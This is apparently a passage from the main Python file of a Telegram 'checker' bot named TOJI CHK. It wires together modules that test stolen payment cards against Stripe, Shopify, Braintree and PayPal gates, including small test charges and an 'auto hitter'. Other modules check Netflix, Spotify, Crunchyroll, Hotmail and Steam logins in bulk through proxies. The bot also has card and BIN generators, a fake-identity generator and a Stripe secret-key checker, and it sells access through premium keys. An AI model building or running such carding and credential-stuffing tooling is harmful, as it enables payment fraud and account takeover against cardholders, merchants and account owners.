import os
import json
import logging
import re
import requests
import asyncio
import random
import time
import aiohttp
import html
from datetime import datetime
from typing import Optional, Dict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
    ApplicationHandlerStop,
)
from telegram.error import ChatMigrated, TelegramError
from dotenv import load_dotenv
import sys
sys.path.insert(0, 'gates/stripe')
sys.path.insert(0, 'gates/shopify')
sys.path.insert(0, 'gates/braintree')
sys.path.insert(0, 'acc gates/crunchyroll')
from gates.stripe.main import (
    chk_command, 
    mchk_command, 
    setsurl_command, 
    setauth_command,
    receive_auth_mode,
    receive_credentials,
    cancel_command as stripe_cancel,
    AWAITING_AUTH_MODE,
    AWAITING_CREDENTIALS
)
from gates.shopify.main import (
    sh as shopify_sh,
    msh as shopify_msh,
    seturl as shopify_seturl,
    myurl as shopify_myurl,
    rmurl as shopify_rmurl,
    addp as shopify_addp,
    rp as shopify_rp,
    lp as shopify_lp,
    cp as shopify_cp,
    chkurl as shopify_chkurl,
    mchku as shopify_mchku
)
from gates.braintree.bot import (
    br_command as braintree_br,
    mbr_command as braintree_mbr,
    setburl_command as braintree_setburl,
    myburl_command as braintree_myburl,
    rmburl_command as braintree_rmburl,
    baddp_command as braintree_baddp,
    brp_command as braintree_brp,
    blp_command as braintree_blp,
    bcp_command as braintree_bcp,
    chkburl_command as braintree_chkburl,
    mbchku_command as braintree_mbchku,
    receive_auth_mode as braintree_receive_auth_mode,
    receive_credentials as braintree_receive_credentials,
    cancel_braintree,
    AWAITING_AUTH_MODE as BRAINTREE_AWAITING_AUTH_MODE,
    AWAITING_CREDENTIALS as BRAINTREE_AWAITING_CREDENTIALS
)
from cr import CrunchyrollChecker
sys.path.insert(0, 'acc gates/microsoft')
sys.path.insert(0, 'acc gates/netflix')
sys.path.insert(0, 'acc gates/spotify')
from advanced_hotmail_checker import AdvancedHotmailChecker
from gates.stripe.main import chk_command
import importlib.util

# Import Stripe Checkout Processor
stripe_hitter_spec = importlib.util.spec_from_file_location("stripe_hitter", "gates/STRIPE AUTO HITTER/STRIPE AUTO HITTER.py")
stripe_hitter_module = importlib.util.module_from_spec(stripe_hitter_spec)
stripe_hitter_spec.loader.exec_module(stripe_hitter_module)
StripeCheckoutProcessor = stripe_hitter_module.StripeCheckoutProcessor

# Global settings for Checkout Session
CS_GLOBAL_SETTINGS = {
    'proxy': None
}

# Conversation states for /cs
AWAITING_CS_URL = 100
AWAITING_CS_CC = 101
import importlib.util
netflix_spec = importlib.util.spec_from_file_location("netflix", "acc gates/netflix/netflix.py")
netflix_module = importlib.util.module_from_spec(netflix_spec)
netflix_spec.loader.exec_module(netflix_module)
NetflixAutomation = netflix_module.NetflixAutomation
spotify_spec = importlib.util.spec_from_file_location("spotify", "acc gates/spotify/login_automation.py")
spotify_module = importlib.util.module_from_spec(spotify_spec)
spotify_spec.loader.exec_module(spotify_module)
SpotifyLoginAutomation = spotify_module.SpotifyLoginAutomation
paypal_spec = importlib.util.spec_from_file_location("paypal_processor", "gates/paypal/main.py")
paypal_module = importlib.util.module_from_spec(paypal_spec)
paypal_spec.loader.exec_module(paypal_module)
PayPalProcessor = paypal_module.PayPalProcessor
spec = importlib.util.spec_from_file_location("site_checker", "tools/site gate chk/main.py")
site_checker_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(site_checker_module)
site_gate_analyze = site_checker_module.analyze_site
site_gate_mass = site_checker_module.analyze_mass_sites
faker_spec = importlib.util.spec_from_file_location("fake", "tools/faker/fake.py")
faker_module = importlib.util.module_from_spec(faker_spec)
faker_spec.loader.exec_module(faker_module)
generate_fake_identity = faker_module.generate_fake_identity
format_fake_identity_message = faker_module.format_fake_identity_message
sk_spec = importlib.util.spec_from_file_location("sk_checker", "tools/sk chk/sk_checker.py")
sk_module = importlib.util.module_from_spec(sk_spec)
sk_spec.loader.exec_module(sk_module)
check_stripe_sk = sk_module.check_stripe_sk
format_sk_check_message = sk_module.format_sk_check_message
cr_api_spec = importlib.util.spec_from_file_location("crunchyroll_api", "acc gates/crunchyroll api based/crunchyroll_checekr.py")
cr_api_module = importlib.util.module_from_spec(cr_api_spec)
cr_api_spec.loader.exec_module(cr_api_module)
cr_api_check_account = cr_api_module.check_account
cr_api_format_proxy = cr_api_module.format_proxy
from access_control import (
    add_authorized_group,
    is_group_authorized,
    generate_premium_key,
    redeem_key,
    is_premium_user,
    get_key_info,
    clean_expired_premium,
    get_authorized_groups,
    ban_user,
    unban_user,
    is_user_banned,
    get_banned_users,
    remove_premium,
    get_premium_users
)
proxy_spec = importlib.util.spec_from_file_location("proxy_checker", "tools/proxy_checker.py")
proxy_module = importlib.util.module_from_spec(proxy_spec)
proxy_spec.loader.exec_module(proxy_module)
check_proxy_func = proxy_module.check_proxy
format_proxy_result = proxy_module.format_proxy_result

stripe_charge_spec = importlib.util.spec_from_file_location("stripe_charge", "gates/stripe charge/stripe 1$.py")
stripe_charge_module = importlib.util.module_from_spec(stripe_charge_spec)
stripe_charge_spec.loader.exec_module(stripe_charge_module)
stripe_charge_check = stripe_charge_module.check_card

braintree_bt_spec = importlib.util.spec_from_file_location("braintree_bt", "gates/braintree bt/braintree.py")
braintree_bt_module = importlib.util.module_from_spec(braintree_bt_spec)
braintree_bt_spec.loader.exec_module(braintree_bt_module)
braintree_bt_check = braintree_bt_module.check_card

async def get_bin_info(bin_number):
    """Get BIN information from API"""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        'type': data.get('brand', 'N/A'),
                        'country': data.get('country_name', 'N/A'),
                        'bank': data.get('bank', 'N/A')
                    }
    except Exception:
        pass
    return {
        'type': 'N/A',
        'country': 'N/A',
        'bank': 'N/A'
    }

async def get_vbv_info(cc_number):
    """Get VBV (3D Secure) information from API"""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            url = f"https://ronak.xyz/vbv.php?lista={cc_number}"
            async with session.get(url) as response:
                if response.status == 200:
                    text = await response.text()
                    return text.strip() if text else 'N/A'
    except Exception:
        pass
    return 'N/A'

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not found in environment variables!")
    logger.error("Please set BOT_TOKEN environment variable:")
    logger.error("  export BOT_TOKEN='your_bot_token'")
    logger.error("Or create a .env file with: BOT_TOKEN=your_bot_token")
    sys.exit(1)

ADMIN_OWNER_ID = 6124719858
ADMIN_OWNER_USERNAME = 'MUMIRU_01'
ADMIN_IDS = [ADMIN_OWNER_ID, 1805944073]

def is_admin(user_id: int, username: str = None) -> bool:
    """Check if user is admin/owner"""
    if user_id == ADMIN_OWNER_ID:
        return True
    if username and username.lower() == ADMIN_OWNER_USERNAME.lower():
        return True
    if user_id in ADMIN_IDS:
        return True
    return False

# Global Settings
USERS_FILE = 'users.json'
VIDEO_FILE_ID = None

WAITING_GROUP_LINK = 1
WAITING_GROUP_ID = 2

GBIN_WAITING_TYPE = 3
GBIN_WAITING_DIGITS = 4

MS_WAITING_ACCOUNTS = 5
MS_GLOBAL_SETTINGS = {
    'proxy': None,
    'workers': 25
}

CR_WAITING_ACCOUNTS = 6

NETFLIX_GLOBAL_SETTINGS = {
    'proxy': None
}

SPOTIFY_GLOBAL_SETTINGS = {
    'proxy': None
}

CR_API_GLOBAL_SETTINGS = {
    'proxy': None
}

STEAM_GLOBAL_SETTINGS = {
    'proxy': None,
    'workers': 25
}

NETFLIX_WAITING_ACCOUNTS = 7
SPOTIFY_WAITING_ACCOUNTS = 8
CR_API_WAITING_ACCOUNTS = 9
STEAM_WAITING_ACCOUNTS = 10

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except json.JSONDecodeError as e:
            logger.error(f"Error loading users.json: {e}")
            backup_file = f"{USERS_FILE}.backup"
            logger.warning(f"Creating backup at {backup_file}")
            if os.path.exists(USERS_FILE):
                import shutil
                shutil.copy(USERS_FILE, backup_file)
            return {}
    return {}

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving users.json: {e}")

def is_registered(user_id):
    users = load_users()
    return str(user_id) in users

def register_user(user_id, username):
    users = load_users()
    users[str(user_id)] = {
        'telegram_id': user_id,
        'username': username,
        'registered_at': datetime.now().isoformat()
    }
    save_users(users)

# Task workers configuration
MAX_WORKERS = 25
PREMIUM_WORKERS = 60
ADMIN_WORKERS = 160

def get_max_workers(user_id: int) -> int:
    """Get max workers based on admin/premium status"""
    if is_admin(user_id):
        return ADMIN_WORKERS
    if is_premium_user(user_id):
        return PREMIUM_WORKERS
    return MAX_WORKERS

# Rate limiting storage: {user_id: [timestamp1, timestamp2, timestamp3]}
USER_COMMAND_TIMESTAMPS = {}

async def check_rate_limit(user_id: int, username: str = None) -> Optional[int]:
    """
    Check if user is rate limited.
    Returns wait time in seconds if limited, None otherwise.
    """
    if is_admin(user_id, username):
        return None
        
    now = time.time()
    if user_id not in USER_COMMAND_TIMESTAMPS:
        USER_COMMAND_TIMESTAMPS[user_id] = []
        
    # Clean up old timestamps (older than 60s to be safe)
    USER_COMMAND_TIMESTAMPS[user_id] = [ts for ts in USER_COMMAND_TIMESTAMPS[user_id] if now - ts < 60]
    
    user_timestamps = USER_COMMAND_TIMESTAMPS[user_id]
    
    # Logic: After 3 commands, need to wait.
    if len(user_timestamps) >= 3:
        last_action_time = user_timestamps[-1]
        
        if is_premium_user(user_id):
            wait_time = 6
        else:
            wait_time = 12
            
        remaining_wait = wait_time - (now - last_action_time)
        if remaining_wait > 0:
            return int(remaining_wait)
            
        # If we reached here, the wait is over, reset the counter for the next burst
        USER_COMMAND_TIMESTAMPS[user_id] = []
        
    USER_COMMAND_TIMESTAMPS[user_id].append(now)
    return None

async def enforce_access_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Middleware to enforce group-only access with premium/admin exceptions"""
    if not update or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    chat_type = update.effective_chat.type if update.effective_chat else "private"
    chat_id = update.effective_chat.id if update.effective_chat else user_id
    
    logger.info(f"Access check for user {user_id} (@{username}) in {chat_type} chat {chat_id}")
    
    if is_user_banned(user_id):
        if update.message:
            try:
                await update.message.reply_text(
                    "╔═══════════════════════════════╗\n"
                    "   🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗\n"
                    "╚═══════════════════════════════╝\n\n"
                    "❌ You have been banned from using this bot.\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "📩 Contact @MUMIRU if you think this is a mistake."
                )
            except:
                pass
        raise ApplicationHandlerStop
    
    #decision = "allowed"
    if is_admin(user_id, username):
        logger.info(f"Access granted: Admin {user_id}")
        return
    
    # Rate limiting check
    wait_time = await check_rate_limit(user_id, username)
    if wait_time:
        if update.message:
            try:
                await update.message.reply_text(
                    f"⚠️ 𝗦𝗟𝗢𝗪 𝗗𝗢𝗪𝗡!\n\n"
                    f"❌ You are sending commands too fast.\n"
                    f"⏳ Please wait <b>{wait_time}s</b> before sending another command.\n\n"
                    f"💎 Premium users have shorter wait times!",
                    parse_mode='HTML'
                )
            except:
                pass
        raise ApplicationHandlerStop
    
    authorized_groups = get_authorized_groups()
    
    # Check for core commands first to allow them in any chat (except banned users)
    if update.message and update.message.text:
        text = update.message.text.lower()
        if text.startswith('/start') or text.startswith('/register') or text.startswith('/redeem'):
            logger.info(f"Access granted: Core command {user_id}")
            return
    elif update.callback_query:
        # Always allow callback queries for navigation/registration
        logger.info(f"Access granted: Callback query {user_id}")
        return

    if chat_type == 'private':
        if is_premium_user(user_id):
            logger.info(f"Access granted: Premium user {user_id}")
            return
        
        groups_list = ""
        if authorized_groups:
            groups_list = "\n\n╔══════════════════════════════╗\n"
            groups_list += "   📢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n"
            groups_list += "╚══════════════════════════════╝\n\n"
            
            for idx, (group_id, group_info) in enumerate(authorized_groups.items(), 1):
                invite_link = group_info.get('invite_link', 'N/A')
                groups_list += f"🔹 Group {idx}\n"
                groups_list += f"   🔗 {invite_link}\n\n"
            
            groups_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            groups_list += "👆 Join any group above to use the bot in the group for free!"
        else:
            groups_list = "\n\n⚠️ No authorized groups available yet.\n📩 Contact @MUMIRU for access."
        
        message = (
            "╔═══════════════════════════════╗\n"
            "   🚫 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗\n"
            "╚═══════════════════════════════╝\n\n"
            "❌ This bot can't be used in private! you can only use the bot in the group \n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💎 𝗛𝗼𝘄 𝘁𝗼 𝗚𝗲𝘁 𝗔𝗰𝗰𝗲𝘀𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Option 1: Join an group andin those group u can use the bot free \n"
            "✅ Option 2: Get premium key (/redeem <key>)\n"
            f"{groups_list}"
        )
        
        try:
            if update.message:
                await update.message.reply_text(message)
            elif update.callback_query:
                await update.callback_query.answer(
                    "❌ Premium access required for private use!",
                    show_alert=True
                )
        except ChatMigrated as e:
            logger.warning(f"Chat migrated to supergroup: {e.new_chat_id}")
        except TelegramError as e:
            logger.error(f"Telegram error in access control: {e}")
        raise ApplicationHandlerStop
    
    elif chat_type in ['group', 'supergroup']:
        if is_group_authorized(chat_id):
            logger.info(f"Access granted: Authorized group {chat_id}")
            return
        
        # Even for commands like /start, block in unauthorized groups
        # unless it's an admin (already handled above)
        
        groups_list = ""
        if authorized_groups:
            groups_list = "\n\n╔══════════════════════════════╗\n"
            groups_list += "   ✅ 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n"
            groups_list += "╚══════════════════════════════╝\n\n"
            
            for idx, (group_id, group_info) in enumerate(authorized_groups.items(), 1):
                invite_link = group_info.get('invite_link', 'N/A')
                groups_list += f"🔹 Group {idx}\n"
                groups_list += f"   🔗 {invite_link}\n\n"
            
            groups_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            groups_list += "👆 Use the bot in these groups!"
        else:
            groups_list = "\n\n📩 Contact @MUMIRU_bro to authorize this group."
        
        message = (
            "╔════════════════════════════════╗\n"
            "   ⛔ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗\n"
            "╚════════════════════════════════╝\n\n"
            "❌ This group is not authorized!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 This bot only works in authorized groups.\n"
            f"{groups_list}"
        )
        
        try:
            if update.message:
                await update.message.reply_text(message)
            elif update.callback_query:
                await update.callback_query.answer(
                    "❌ This group is not authorized!",
                    show_alert=True
                )
        except ChatMigrated as e:
            logger.warning(f"Chat migrated to supergroup: {e.new_chat_id}")
        except TelegramError as e:
            logger.error(f"Telegram error in access control: {e}")
        raise ApplicationHandlerStop

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "     🔰 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗕𝗢𝗧 🔰\n"
            "╚═════════════════════════╝\n\n"
            "👋 Welcome to TOJI CHK!\n\n"
            "⚠️ You need to register first.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Use /register to get started\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔐 Secure • Fast • Reliable"
        )
        return
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "     🔰 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗕𝗢𝗧 🔰\n"
        "╚═════════════════════════╝\n\n"
        f"✅ Welcome back, {update.effective_user.first_name}!\n\n"
        f"👤 User: @{update.effective_user.username or 'N/A'}\n"
        f"🆔 ID: {user_id}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 Use /cmd to see all commands\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "Unknown"
    
    if is_registered(user_id):
        await update.message.reply_text(
            "╔════════════════════╗\n"
            "   ✅ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗\n"
            "╚════════════════════╝\n\n"
            "You're already registered! 🎉\n"
            "Use /cmd to access features."
        )
        return
    
    register_user(user_id, username)
    await update.message.reply_text(
        "╔════════════════════════╗\n"
        "   🎉 𝗥𝗘𝗚𝗜𝗦𝗧𝗥𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n"
        "╚════════════════════════╝\n\n"
        f"👤 Welcome, @{username}!\n"
        f"🆔 User ID: {user_id}\n\n"
        "✅ You can now use all features!\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 Type /cmd to get started\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

async def safe_edit_message(query, text, reply_markup=None):
    try:
        # Check if it's a video message - edit caption instead of text
        if query.message.video:
            await query.edit_message_caption(caption=text, reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
    except:
        # Fallback: delete and send new message if edit fails
        await query.message.delete()
        await query.message.reply_text(text, reply_markup=reply_markup)

async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global VIDEO_FILE_ID
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    keyboard = [
        [InlineKeyboardButton("👑 Admin Panel", callback_data='admin')],
        [InlineKeyboardButton("🛠 Utility Tools", callback_data='tools'), InlineKeyboardButton("🚪 Payment Gates", callback_data='gates')],
        [InlineKeyboardButton("📊 Account Checkers", callback_data='account_checker')],
        [InlineKeyboardButton("💳 Card Checkers", callback_data='card_gates')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        "╔══════════════════════════╗\n"
        "     ⚡ 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗠𝗘𝗡𝗨 ⚡\n"
        "╚══════════════════════════╝\n\n"
        "🟢 Status: 𝗢𝗻𝗹𝗶𝗻𝗲\n"
        "🌐 Version: 𝘃𝟮.𝟬 (𝗨𝗽𝗱𝗮𝘁𝗲𝗱)\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 𝗤𝘂𝗶𝗰𝗸 𝗔𝗰𝗰𝗲𝘀𝘀:\n"
        "├ /start - Launch bot ✅\n"
        "├ /register - Sign up ✅\n"
        "└ /cmd - Commands menu ✅\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👇 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗲𝘅𝗽𝗹𝗼𝗿𝗲:"
    )
    
    if VIDEO_FILE_ID:
        sent_message = await update.message.reply_video(
            video=VIDEO_FILE_ID,
            caption=message,
            reply_markup=reply_markup
        )
    else:
        video_path = 'video/toji.mp4'
        with open(video_path, 'rb') as video_file:
            sent_message = await update.message.reply_video(
                video=video_file,
                caption=message,
                reply_markup=reply_markup
            )
        VIDEO_FILE_ID = sent_message.video.file_id

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'admin':
        keyboard = [
            [InlineKeyboardButton("👤 Admin Username", callback_data='admin_username')],
            [InlineKeyboardButton("⚙️ Admin Commands", callback_data='admin_cmds')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = (
            "╔═══════════════════╗\n"
            "   👨‍💼 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟\n"
            "╚═══════════════════╝\n\n"
            "🔐 Admin Control Panel\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Select an option:"
        )
        
        try:
            await safe_edit_message(query, message_text, reply_markup=reply_markup)
        except:
            await query.message.delete()
            await query.message.reply_text(message_text, reply_markup=reply_markup)
    
    elif query.data == 'admin_username':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='admin')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   👑 𝗔𝗗𝗠𝗜𝗡 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘\n"
            "╚═══════════════════════╝\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Admin: @{ADMIN_USERNAME}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💬 Contact for support", reply_markup=reply_markup)
    
    elif query.data == 'admin_cmds':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='admin')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═════════════════════════╗\n"
            "   ⚙️ 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "╚═════════════════════════╝\n\n"
            "🔧 Administrative Tools\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📊 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀 & 𝗨𝘀𝗲𝗿𝘀:\n"
            "├ /stats - Bot statistics ✅\n"
            "└ /users - User list ✅\n\n"
            "🏢 𝗚𝗿𝗼𝘂𝗽 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁:\n"
            "├ /addgroup - Add group ✅\n"
            "├ /groups - List groups ✅\n"
            "└ /removegroup - Remove group ✅\n\n"
            "🔑 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗞𝗲𝘆𝘀:\n"
            "└ /key - Generate key ✅\n\n"
            "📢 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝗰𝗮𝘁𝗶𝗼𝗻:\n"
            "└ /broadcast - Mass message ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'tools':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════════╗\n"
            "   🛠 𝗧𝗢𝗢𝗟𝗦 & 𝗨𝗧𝗜𝗟𝗜𝗧𝗜𝗘𝗦\n"
            "╚═══════════════════════════╝\n\n"
            "🎲 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /gen - Generate cards ✅\n"
            "├ /gbin - Generate BINs ✅\n"
            "└ /fake - Fake identity ✅\n\n"
            "🔍 𝗕𝗜𝗡 𝗧𝗼𝗼𝗹𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /bin - Single BIN check ✅\n"
            "├ /mbin - Mass BIN check ✅\n"
            "└ /vbv - Check VBV status ✅\n\n"
            "🔑 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "└ /sk - Check Stripe SK ✅\n\n"
            "🌐 𝗦𝗶𝘁𝗲 𝗔𝗻𝗮𝗹𝘆𝘇𝗲𝗿:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /site - Analyze website ✅\n"
            "└ /msite - Mass analyze ✅\n\n"
            "🛡 𝗣𝗿𝗼𝘅𝘆 𝗧𝗼𝗼𝗹𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "└ /proxy - Check proxy (IP Info) ✅\n\n"
            "⚙️ 𝗨𝘁𝗶𝗹𝗶𝘁𝗶𝗲𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /split - Split card list ✅\n"
            "├ /clean - Clean CC file ✅\n"
            "├ /info - User info ✅\n"
            "└ /me - My profile ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✨ All tools are working!", reply_markup=reply_markup)
    
    elif query.data == 'gates':
        keyboard = [
            [InlineKeyboardButton("Shopify", callback_data='gate_shopify'), InlineKeyboardButton("Stripe", callback_data='gate_stripe')],
            [InlineKeyboardButton("Braintree", callback_data='gate_braintree'), InlineKeyboardButton("PayPal", callback_data='gate_paypal')],
            [InlineKeyboardButton("CyberSource", callback_data='gate_cyber'), InlineKeyboardButton("Auth Based", callback_data='gate_auth')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   🚪 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗚𝗔𝗧𝗘𝗦\n"
            "╚═══════════════════════╝\n\n"
            "💳 Select Payment Gateway\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Choose a gate category:", reply_markup=reply_markup)
    
    elif query.data == 'card_gates':
        keyboard = [
            [InlineKeyboardButton("Shopify Checks", callback_data='gate_shopify')],
            [InlineKeyboardButton("Stripe Checks", callback_data='gate_stripe')],
            [InlineKeyboardButton("Braintree Checks", callback_data='gate_braintree')],
            [InlineKeyboardButton("PayPal Checks", callback_data='gate_paypal')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   💳 𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥𝗦\n"
            "╚═══════════════════════╝\n\n"
            "⚡ Select a gate to check cards\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Available Gates:", reply_markup=reply_markup)
    
    elif query.data == 'gate_shopify':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════╗\n"
            "   🛍 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗚𝗔𝗧𝗘\n"
            "╚═════════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sh - Single check ✅\n"
            "└ /msh - Mass check (5x) ✅\n\n"
            "━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_sk':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═══════════════════╗\n"
            "   🔑 𝗦𝗞 𝗕𝗔𝗦𝗘𝗗 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sk - Single check ✅\n"
            "└ /msk - Mass check (5x) ✅\n\n"
            "━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_stripe':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═══════════════════╗\n"
            "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /chk - Single check ✅\n"
            "├ /mchk - Mass check (File/Text) ✅\n"
            "├ /st - Charged check ($1) ✅\n"
            "└ /mst - Mass charged ($1) ✅\n\n"
            "━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_braintree':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════╗\n"
            "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗚𝗔𝗧𝗘\n"
            "╚═════════════════════════╝\n\n"
            "🟢 Status: 𝗔𝗰𝘁𝗶𝘃𝗲 ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /br - Single check ✅\n"
            "├ /bt - Braintree Charged ($1) ✅\n"
            "└ /mbt - Mass Braintree Charged ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_cyber':
